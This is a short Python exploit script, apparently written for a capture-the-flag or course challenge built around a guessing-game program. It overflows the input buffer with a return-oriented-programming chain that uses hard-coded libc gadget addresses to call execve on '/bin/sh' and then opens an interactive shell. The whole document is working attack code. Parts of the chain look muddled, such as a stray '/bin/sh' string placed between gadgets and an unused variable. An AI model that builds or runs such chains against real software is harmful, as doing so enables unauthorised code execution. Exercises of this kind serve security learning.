import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

# --- Fixed Addresses Found ---
LIBC_BASE     = 0x7f000042c000
BIN_SH_ADDR   = 0x7f00005b8d57


# --- Calculate Gadget Addresses from your offsets ---
# 0x00021102 : pop rdi ; ret
POP_RDI_RET  = LIBC_BASE + 0x21102 

# 0x000202e8 : pop rsi ; ret
POP_RSI_RET  = LIBC_BASE + 0x202e8

# 0x00001b92 : pop rdx ; ret
POP_RDX_RET  = LIBC_BASE + 0x1b92

# 0x00033544 : pop rax ; ret
POP_RAX_RET  = LIBC_BASE + 0x33544

# SYSCALL
SYSCALL = LIBC_BASE + 0x00000000000bc375 
 
p.readuntil('Enter a single char for a guess, or a string for a full guess:')
rop_chain_string =  b'rop chain\x00'
payload = b'/bin/sh\x00' + b'A'*55 + b'\0' + b'B'*8 + p64(POP_RDI_RET) + b'/bin/sh\x00'
payload += p64(POP_RDI_RET) + p64(BIN_SH_ADDR)
payload += p64(POP_RSI_RET) + p64(0x0)
payload += p64(POP_RDX_RET) + p64(0x0)
payload += p64(POP_RAX_RET) + p64(0x3b)
payload += p64(SYSCALL)

p.sendline(payload)



p.interactive()